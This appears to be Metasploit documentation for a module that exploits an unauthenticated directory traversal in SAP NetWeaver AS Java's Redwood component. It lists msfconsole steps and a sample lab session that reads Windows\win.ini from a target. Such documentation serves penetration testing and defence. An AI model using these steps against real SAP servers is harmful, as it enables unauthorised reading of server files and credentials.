# Description
This is a module for exploitation an anon directory traversal vulnerability in SAP NetWeaver Application Server Java in Redwood module. The vulnerability was active exploited from Chines hackers in the wild in 2017.


# Verification Steps
```
Start msfconsole
use auxiliary/scanner/sap/sap_redwood_traversal
set RHOSTS [IP]
set FILEPATH [file_on_remote_server]
set DEPTH [number]
run
```

## Scenarios
Tested on Windows 2008 with SAP NetWeaver AS Java 7.52
```
msf5 > use auxiliary/scanner/sap/sap_redwood_traversal 
msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set rhosts 192.168.2.164
rhosts => 192.168.2.164
msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set DEPTH 25
DEPTH => 25
msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set FILEPATH Windows\win.ini
FILEPATH => Windows\win.ini
msf5 auxiliary(scanner/sap/sap_redwood_traversal) > run

[+] 192.168.2.164:50000 - ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

[+] File saved in: [local_path_in_your_machine]
```
